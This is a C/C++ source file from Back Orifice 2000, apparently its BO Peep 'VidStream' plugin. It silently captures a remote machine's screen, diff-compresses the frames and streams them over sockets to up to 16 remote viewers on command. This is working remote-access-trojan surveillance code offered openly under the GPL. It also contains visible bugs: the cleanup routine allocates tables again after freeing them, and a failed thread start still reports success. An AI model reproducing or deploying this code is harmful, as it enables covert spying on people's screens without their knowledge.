/*  Back Orifice 2000 - Remote Administration Suite
    Copyright (C) 1999, Cult Of The Dead Cow

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

	The author of this program may be contacted at dildog@l0pht.com. */

#include<windows.h>
#include<plugins.h>
#include<auth.h>
#include<bocomreg.h>
#include<iohandler.h>
#include<encryption.h>
#include<config.h>
#include<strhandle.h>
#include"bo_peep.h"
#include"vidstream.h"
#include"client.h"

#define MAX_STREAMS 16
#define MTU_STREAM 1400

typedef struct {
	int xdim;
	int ydim;
	int rate;
	CAuthSocket *pSock;
} VSLISTEN_ARGS;


// -------------------- Global Variables ------------------------

// VidStream control
static HANDLE g_hVThread=NULL;
static BOOL g_bStrActive=FALSE;

// Screen device
static HDC g_hScrDC;

// Full screen dibits
static int g_xscdim;
static int g_yscdim;
static BYTE  *g_pcFullGreyBits;

// Viewport dibits
static int g_xsize;
static int g_ysize;
static HDC g_hViewDC;
static HBITMAP g_hbmView;
static BITMAPINFOHEADER g_bmhView;
static DWORD *g_pdwViewBits;
static BYTE  *g_pcViewGreyBits;

// Cursor and view positions
static WORD g_wViewPosX,g_wViewPosY;
static WORD g_wCurPosX,g_wCurPosY;
static WORD g_wLastCurPosX,g_wLastCurPosY;

// Diff dibits
static BYTE *g_pcDiffBits;

// Greyscale conversion
static DWORD *g_pGreyTable;

// Rectangular compresion
static WORD *g_pRectCmp;


// ----------------------- Function Implementations ------------------------------

// RLECompress: Run length encoder

BYTE *RLECompress(BYTE *frame, int size, int *pnRLESize)
{
	BYTE *rlebuf=(BYTE *)malloc(size*2);
	if(rlebuf==NULL) return NULL;
	int i,outpos,inpos,cnt,runcnt;

	cnt=0;
	inpos=0;
	outpos=0;
	i=0;
	while(i<size) {
		if(i<(size-2) && (frame[i+1]==frame[i] && frame[i+2]==frame[i])) {
			// Check for RLE run
			BYTE col=frame[i];
			i++;
			runcnt=1;
			while(i<size && runcnt<127) {
				if(frame[i]!=col) break;
				i++;
				runcnt++;
			}
			
			// Emit block of pixels
			if(cnt>0) {
				rlebuf[outpos]=cnt;
				memcpy(rlebuf+outpos+1,frame+inpos,cnt);
				outpos+=(1+cnt);
				cnt=0;
			}
			inpos=i;
			
			// Emit RLE run of pixels
			rlebuf[outpos]=0x80 | runcnt;
			rlebuf[outpos+1]=col;
			outpos+=2;
		} else {
			cnt++;
			
			if(cnt==127 || (i==(size-1) && cnt>0)) {
				// Emit block of pixels
				rlebuf[outpos]=cnt;
				memcpy(rlebuf+outpos+1,frame+inpos,cnt);
				outpos+=(1+cnt);
				cnt=0;
				inpos=i;
			}
			i++;
		}
	}

	*pnRLESize=outpos;
	return rlebuf;
}

// RLEFree: cleanup after RLECompress()

void RLEFree(BYTE *buf)
{
	free(buf);
}

/*
// RectCompress: Rectangular compression engine

BYTE *RectCompress(int size, BYTE *frame, int *pnRLESize)
{
	BYTE *rectbuf=(BYTE *)malloc(size*2);
	if(rectbuf==NULL) return NULL;
	int outpos,inpos;

	int x,y,nrx,nry,a,b;
	nrx=g_xsize/16;
	nry=g_ysize/16;

	// Find blocks of solid colors
	for(y=0;y<nry;y++) {
		for(x=0;x<nrx;x++) {
			inpos=(x+y*g_ysize)*16;
			BYTE col=frame[inpos];
		
			// check for colors	
			for(b=0;b<16;b++) {
				for(a=0;a<16;a++) {
					if(col!=frame[inpos+a+b*g_xsize]) break;
				}
			}
			if(b==16) g_pRectCmp[x+y*nry]=col;
			else g_pRectCmp[x+y*nry]=0x8000;
		}	
	}

	// Expand solid color areas
	for(y=0;y<nry;y++) {
		for(x=0;x<nrx;x++) {
			
		}
	}

//	*pnRLESize=outpos;
	return rectbuf;
}


// RectFree: Cleanup after RectCompress()

void RectFree(BYTE *buf)
{
	free(buf);
}
*/

// ReduceFrame: Performs greyscale conversion of a series of 32 bit color pixels.

int ReduceFrame(DWORD *pInFrame,BYTE *pOutFrame,int cnt)
{
	__asm {
		mov ecx, dword ptr [cnt]
		mov edi, dword ptr [pOutFrame]
		mov esi, dword ptr [pInFrame]
		mov ebx, dword ptr [g_pGreyTable]
		xor edx,edx
	}
greyloop: _asm {
		mov dl, byte ptr [esi]
		mov eax, dword ptr [ebx+0+edx*4]
		mov dl, byte ptr [esi+1]
		add eax, dword ptr [ebx+1024+edx*4]
		mov dl, byte ptr [esi+2]
		add eax, dword ptr [ebx+2048+edx*4]
		mov byte ptr [edi], ah

		add esi,4
		inc edi
		dec ecx
		jnz greyloop
	}

	return 0;
}

// GetDiffFrame: Find the XOR difference between a viewport and the 'full screen',
// modifies the 'full screen' with the viewport image and returns the difference

BOOL GetDiffFrame(BYTE *pView, int vsx, int vsy, BYTE *pFull, int fx, int fy, int fsx, int fsy, BYTE *pDiff)
{
	BYTE *pFullFrame;
	int nPitchAdd;
	pFullFrame=pFull+fsx*fy+fx;
	nPitchAdd=fsx-vsx;
	DWORD total=0;

	_asm {
		mov esi,dword ptr [pFullFrame]
		mov ebx,dword ptr [pView]
		mov edi,dword ptr [pDiff]

		mov ecx,dword ptr [vsy]
		shl ecx,16
	}
dfyloop: _asm {
		mov cx,word ptr [vsx]
	}
dfxloop: _asm {
		mov eax,dword ptr [esi]
		mov edx,dword ptr [ebx]
		xor eax,edx
		mov dword ptr [edi],eax
		mov dword ptr [esi],edx
		add dword ptr [total],eax

		add ebx,4
		add edi,4
		add esi,4

		sub cx,4
		jnz dfxloop

		add esi,dword ptr [nPitchAdd]

		sub ecx,65536
		jnz dfyloop
	}

	if(total>0) return TRUE;
	return FALSE;
}

// FreeDiffFrame: Cleanup after GetDiffFrame()

void FreeDiffFrame(BYTE *buf)
{
	free(buf);
}



// IssueFullScreen: sends over a compressed image of the entire
// screen, Used to synchronize a client at the start of the stream.

int IssueFullScreen(CAuthSocket *pSock)
{
	// RLECompress the screen image
	int nRLESize;
	BYTE *rlebuf;
	rlebuf=RLECompress(g_pcFullGreyBits, g_xscdim*g_yscdim, &nRLESize);
	if(rlebuf==NULL) 
		return -1;

	// Tack on packet header
	VIDSTREAM_HEADER hdr;
	hdr.wPosX=0;
	hdr.wPosY=0;
	hdr.wSizeX=g_xscdim;
	hdr.wSizeY=g_yscdim;
	hdr.wCurPosX=g_wCurPosX;
	hdr.wCurPosY=g_wCurPosY;
	hdr.wFlags=VHF_FULLFRAME;
	hdr.dwSize=(DWORD)nRLESize;
	
	// Send the packet header (not all the data's going to fit in one packet anyway)
	int nRet,i;
	while((nRet=pSock->Send((BYTE *)&hdr,sizeof(VIDSTREAM_HEADER)))==0) 
		Sleep(20);
	if(nRet==-1) {
		RLEFree(rlebuf);
		return -1;
	}

	// Send packet body
	i=0;
	while(i<nRLESize) {
		int nXmit=((nRLESize-i)>MTU_STREAM)?MTU_STREAM:(nRLESize-i);

		while((nRet=pSock->Send(rlebuf+i,nXmit))==0) Sleep(20);
		if(nRet==-1) {
			RLEFree(rlebuf);
			return -1;
		}

		i+=nXmit;
	}
		
	return 0;
}

// CalcDiffScreen: takes two bitmaps and XORs them, storing the updated
// image in the 'full screen bitmap' and stores the XOR diff, to be 
// compressed and sent to the client.

BYTE *CalcDiffScreen(int *pnDiffSize)
{
	// Get cursor position
	POINT pt;
	GetCursorPos(&pt);
	g_wLastCurPosX=g_wCurPosX;
	g_wLastCurPosY=g_wCurPosY;
	g_wCurPosX=(WORD)pt.x;
	g_wCurPosY=(WORD)pt.y;
	
	// Get viewport position
	int left=pt.x-(g_xsize/2);
	int top=pt.y-(g_ysize/2);
	if(left<0) left=0;
	if(top<0) top=0;
	if(left>(g_xscdim-g_xsize)) left=(g_xscdim-g_xsize);
	if(top>(g_yscdim-g_ysize)) top=(g_yscdim-g_ysize);
	g_wViewPosX=left;
	g_wViewPosY=top;

	// Get viewport bits
	BitBlt(g_hViewDC,0,0,g_xsize,g_ysize,g_hScrDC,left,top,SRCCOPY);
	GetDIBits(g_hViewDC,g_hbmView,0,g_ysize,g_pdwViewBits,(BITMAPINFO *)&g_bmhView,DIB_RGB_COLORS);
		
	// Reduce view dibits to grey frame
	ReduceFrame(g_pdwViewBits,g_pcViewGreyBits,g_xsize*g_ysize);					
	
	// XOR the two frames and get the diff
	if(GetDiffFrame(g_pcViewGreyBits, g_xsize, g_ysize, g_pcFullGreyBits, left, top, g_xscdim, g_yscdim, g_pcDiffBits)) {
		// RLECompress the new frame
		int nRLESize;
		BYTE *rlebuf;
		rlebuf=RLECompress(g_pcDiffBits,g_xsize*g_ysize,&nRLESize);
		if(rlebuf==NULL)
			return NULL;
		*pnDiffSize=nRLESize;
		return rlebuf;	
	} else {
		int i;
		i=0;
	}
	
	return NULL;
}

// FreeDiffScreen: memory cleanup for CalcDiffScreen
void FreeDiffScreen(BYTE *ptr)
{
	if(ptr!=NULL)
		RLEFree(ptr);
}


// IssueDiffScreen: Sends a XOR diff viewport image to the 
int IssueDiffScreen(CAuthSocket *pSock, BYTE *pDiff, int nDiffLen)
{
	// Tack on packet header
	VIDSTREAM_HEADER hdr;

	if(pDiff==NULL) {
		nDiffLen=0;
		if(g_wLastCurPosX==g_wCurPosX && g_wLastCurPosY==g_wCurPosY) return 0;
	}
	
	hdr.wFlags=VHF_FRAMEDIFF;
	hdr.wSizeX=g_xsize;
	hdr.wSizeY=g_ysize;
	hdr.wPosX=g_wViewPosX;
	hdr.wPosY=g_wViewPosY;
	hdr.wCurPosX=g_wCurPosX;
	hdr.wCurPosY=g_wCurPosY;
	hdr.dwSize=(DWORD)nDiffLen;

	// Send the packet header
	int nRet,i;
	while((nRet=pSock->Send((BYTE *)&hdr,sizeof(VIDSTREAM_HEADER)))==0) 
		Sleep(0);
	if(nRet==-1) 
		return -1;

	// Send packet body
	i=0;
	while(i<nDiffLen) {
		int nXmit=((nDiffLen-i)>MTU_STREAM)?MTU_STREAM:(nDiffLen-i);

		while((nRet=pSock->Send(pDiff+i,nXmit))==0) 
			Sleep(0);

		if(nRet==-1) 
			return -1;

		i+=nXmit;
	}
	return 0;
}



DWORD WINAPI VidStreamThread(VSLISTEN_ARGS *pArgs)
{
	int nRate;
	CAuthSocket *pSock,*pChild;
	CAuthSocket *pChildren[MAX_STREAMS];
	int nChildren,i,j;
	DWORD dwPeriod;
	
	// ---------- Get parameters --------------------
	g_xsize=pArgs->xdim;
	g_ysize=pArgs->ydim;
	nRate=pArgs->rate;
	dwPeriod=(1000/nRate);

	pSock=pArgs->pSock;
	free(pArgs);

	g_nNumThreads=1;

	// --------- Initialize screen capture ----------

	// Full screen
	g_hScrDC=GetDC(NULL);
	g_xscdim=GetSystemMetrics(SM_CXSCREEN);
	g_yscdim=GetSystemMetrics(SM_CYSCREEN);
	g_pcFullGreyBits=(BYTE *)malloc(g_xscdim*g_yscdim);

	// Viewport
	memset(&g_bmhView,0,sizeof(BITMAPINFOHEADER));
	g_bmhView.biSize=sizeof(BITMAPINFOHEADER);
	g_bmhView.biWidth=g_xsize;
	g_bmhView.biHeight=-g_ysize;
	g_bmhView.biPlanes=1;
	g_bmhView.biBitCount=32;
	g_bmhView.biCompression=BI_RGB;
	g_bmhView.biSizeImage=0;
	g_pdwViewBits=(DWORD *)malloc(g_xsize*g_ysize*sizeof(DWORD));
	g_pcViewGreyBits=(BYTE *)malloc(g_xsize*g_ysize);
	g_pcDiffBits=(BYTE *)malloc(g_xsize*g_ysize);
	g_hViewDC=CreateCompatibleDC(GetDC(NULL));
	g_hbmView=CreateCompatibleBitmap(GetDC(NULL),g_xsize,g_ysize);
	SelectObject(g_hViewDC,g_hbmView);

	
	// RGB->Grey
	g_pGreyTable=(DWORD *)malloc(sizeof(DWORD)*256*3);
	if(g_pGreyTable==NULL) return -1;
	for(i=0;i<256;i++) {
		g_pGreyTable[i]=i*29;	   // B
		g_pGreyTable[i+256]=i*150; // G
		g_pGreyTable[i+512]=i*77;  // R
	}

	// Rectangular compression
	g_pRectCmp=(WORD *)malloc((g_xsize*g_ysize)/256);
	

	// --------- Do initial desktop capture ---------
	BITMAPINFOHEADER bmhFull;
	memset(&bmhFull,0,sizeof(BITMAPINFOHEADER));
	bmhFull.biSize=sizeof(BITMAPINFOHEADER);
	bmhFull.biWidth=g_xscdim;
	bmhFull.biHeight=-g_yscdim;
	bmhFull.biPlanes=1;
	bmhFull.biBitCount=32;
	bmhFull.biCompression=BI_RGB;
	bmhFull.biSizeImage=0;
	DWORD *pdwFullBits=(DWORD *)malloc(g_xscdim*g_yscdim*sizeof(DWORD));
	HDC hdccap=CreateCompatibleDC(g_hScrDC);
	HBITMAP hbmcap=CreateCompatibleBitmap(g_hScrDC,g_xscdim,g_yscdim);
	HGDIOBJ gdiold=SelectObject(hdccap,hbmcap);
	BitBlt(hdccap,0,0,g_xscdim,g_yscdim,g_hScrDC,0,0,SRCCOPY);
	GetDIBits(hdccap,hbmcap,0,g_yscdim,pdwFullBits,(BITMAPINFO *)&bmhFull,DIB_RGB_COLORS);	
	ReduceFrame(pdwFullBits,g_pcFullGreyBits,g_xscdim*g_yscdim);
	SelectObject(hdccap,gdiold);
	DeleteObject(hbmcap);
	DeleteDC(hdccap);
	free(pdwFullBits);

	// --------------- Data socket loop ----------------------
	nChildren=0;
	DWORD dwThen,dwNow;
	g_bStrActive=TRUE;
	while(g_bStrActive) {
		dwThen=GetTickCount();
		// ------ Check for accepts --------
		if(nChildren<MAX_STREAMS) {
			pChild=pSock->Accept();
			if(pChild!=NULL) {
				// Send new child full screen
				if(IssueFullScreen(pChild)>=0) {
					pChildren[nChildren]=pChild;
					nChildren++;
				} else {
					pChild->Close();
					delete pChild;
				}
			}
		}

		// ------ Broadcast screen diff data ---------
		if(nChildren>0) {
			// Calculate screen diffs
			int nDiffLen;
			BYTE *pDiff=CalcDiffScreen(&nDiffLen);
			
			for(i=(nChildren-1);i>=0;i--) {
				if(IssueDiffScreen(pChildren[i],pDiff,nDiffLen)<0) {
					pChildren[i]->Close();
					delete pChildren[i];
					for(j=i+1;j<nChildren;j++) {
						pChildren[j-1]=pChildren[j];
					}	
					pChildren[j-1]=NULL;
					nChildren--;
				}
			}

			FreeDiffScreen(pDiff);
		}

		// ------- Wait for next frame ---------
		dwNow=GetTickCount();
		if((dwNow-dwThen)<dwPeriod)
			Sleep((dwPeriod-(dwNow-dwThen)));

		if(g_bActive==FALSE) g_bStrActive=FALSE;
	}

	// Free rect comp table
	free(g_pRectCmp);
	// Free greyscale tables
	free(g_pGreyTable);
	
	// Close all connections
	for(i=(nChildren-1);i>=0;i--) {
		pChildren[i]->Close();
		delete pChildren[i];
		pChildren[i]=NULL;
	}
	nChildren=0;
	pSock->Close();
	delete pSock;
	
	// Clean up
	free(g_pcFullGreyBits);

	// Viewport
	free(g_pdwViewBits);
	free(g_pcViewGreyBits);
	free(g_pcDiffBits);
	DeleteDC(g_hViewDC);
	DeleteObject(g_hbmView);
	
	
	// RGB->Grey
	g_pGreyTable=(DWORD *)malloc(sizeof(DWORD)*256*3);
	if(g_pGreyTable==NULL) return -1;
	for(i=0;i<256;i++) {
		g_pGreyTable[i]=i*29;	   // B
		g_pGreyTable[i+256]=i*150; // G
		g_pGreyTable[i+512]=i*77;  // R
	}

	// Rectangular compression
	g_pRectCmp=(WORD *)malloc((g_xsize*g_ysize)/256);
	
	

	g_nNumThreads=0;

	return 0;
}

int CmdProc_StartVidStream(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	char *svXDim=NULL,*svYDim=NULL;
	char *svEnc=NULL,*svAuth=NULL,*svNetMod=NULL,*svParam=NULL;
	
	int nXDim=0,nYDim=0,nRate=15;

	// Check if already started
	if(g_hVThread!=NULL) {
		IssueAuthCommandReply(cas_from,comid,0,"Vidstream socket already created.\n");
		return -1;
	}

	// Get parameters

	svXDim=GetCfgStr(g_szAdvancedOptions,"VidStream X Res");
	svYDim=GetCfgStr(g_szAdvancedOptions,"VidStream Y Res");
	svNetMod=GetCfgStr(g_szAdvancedOptions,"VidStream Net Module");
	svEnc=GetCfgStr(g_szAdvancedOptions,"VidStream Encryption");
	svAuth=GetCfgStr(g_szAdvancedOptions,"VidStream Auth");
	
	if((svParam=svArg2)!=NULL) {
		if(svArg2[0]!='\0') svXDim=svParam;
		if((svParam=BreakString(svXDim,","))!=NULL) {
			if(svParam[0]!='\0') svYDim=svParam;
			if((svParam=BreakString(svYDim,","))!=NULL) {
				if(svParam[0]!='\0') svNetMod=svParam;
				if((svParam=BreakString(svNetMod,","))!=NULL) {
					if(svParam[0]!='\0') svEnc=svParam;
					if((svParam=BreakString(svEnc,","))!=NULL) {
						if(svParam[0]!='\0') svAuth=svParam;
					}
				}
			}
		}
	}
	
	nRate=nArg1;
	if(nRate<=0) nRate=15;
	
	// Create listener socket
	svParam=GetCfgStr(g_szAdvancedOptions,"VidStream Bind Str");
	if(svArg3!=NULL) {
		if(svArg3[0]!='\0') svParam=svArg3;
	}
	CAuthSocket *pSock=ListenAuthSocket(InteractiveListen,cas_from->GetUserID(),NULL, svParam,svNetMod,svEnc,svAuth);
	if(pSock==NULL || pSock==(CAuthSocket *)0xFFFFFFFF) {
		IssueAuthCommandReply(cas_from,comid,0,"Couldn't start listening socket.\n");	
		return -1;
	}

	// Spawn listener thread
	VSLISTEN_ARGS *pArgs=(VSLISTEN_ARGS *)malloc(sizeof(VSLISTEN_ARGS));
	if(pArgs==NULL) {
		pSock->Close();
		IssueAuthCommandReply(cas_from,comid,0,"Memory allocation error.\n");
		return -1;
	}
	pArgs->xdim=atoi(svXDim);
	pArgs->ydim=atoi(svYDim);
	pArgs->pSock=pSock;
	pArgs->rate=nRate;

	DWORD dwTid;
	g_hVThread=CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)VidStreamThread,pArgs,0,&dwTid);
	if(g_hVThread==NULL) {
		free(pArgs);
		pSock->Close();
		IssueAuthCommandReply(cas_from,comid,0,"Could create thread.\n");
	}
	
	char svResponse[512],svConAddr[256];
	pSock->GetConnectAddr(svConAddr,256);
	wsprintf(svResponse, "VidStream started on %.256s\n",svConAddr);
	IssueAuthCommandReply(cas_from, comid, 0, svResponse);
	return 0;
}

int CmdProc_StopVidStream(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	g_bStrActive=FALSE;
	if(WaitForSingleObject(g_hVThread,5000)!=WAIT_OBJECT_0) {
		IssueAuthCommandReply(cas_from, comid, 0, "Couldn't stop vidstream in 5 sec. Aborting thread.\n");
		TerminateThread(g_hVThread,0);
	}
	CloseHandle(g_hVThread);
	g_hVThread=NULL;
	
	IssueAuthCommandReply(cas_from, comid, 0, "VidStream stopped.\n");
	return 0;
}

